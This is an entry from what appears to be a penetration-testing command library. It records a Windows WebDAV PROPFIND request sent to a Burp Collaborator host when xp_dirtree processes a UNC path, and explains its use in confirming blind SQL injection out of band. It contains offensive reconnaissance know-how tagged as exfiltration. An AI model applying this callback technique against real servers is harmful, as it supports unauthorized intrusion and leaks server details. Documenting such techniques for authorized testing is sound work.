---
id: cmd-uuid-002
data: |-
  PROPFIND /random HTTP/1.1
  Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net
  Content-Length: 0
  Depth: 0
  translate: f
  User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002
  Accept-Encoding: gzip, deflate, identity
  Connection: Keep-Alive
  X-BlueCoat-Via: ██████████
tags:
  - webdav
  - exfiltration
type: command
output: null
executor: http
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.854Z'
verified: false
validated: true
submitted: true
---
# propfind-webdav-request

## Command

```http
PROPFIND /random HTTP/1.1
Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net
Content-Length: 0
Depth: 0
translate: f
User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
X-BlueCoat-Via: ██████████
```

## Description

This is an observed HTTP PROPFIND request auto-sent by a Windows server via WebDAV MiniRedir when xp_dirtree processes a UNC path, used to confirm SQL execution in blind injections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Depth | Limits request recursion (0 = shallow) | Yes |
| translate | Forces WebDAV translation (f) | Yes |
| User-Agent | Identifies client (Microsoft-WebDAV-MiniRedir) | Auto |

## Examples

### Basic Usage

Observed directly on collaborator; no manual execution.

### Advanced Usage

N/A; this is a side-effect request.

## Expected Output

Intercepted on collaborator, revealing server details like User-Agent and proxy info.

## Related

- [[Related Procedure: Confirm-Exploitation-via-Out-of-Band-Interactions]]
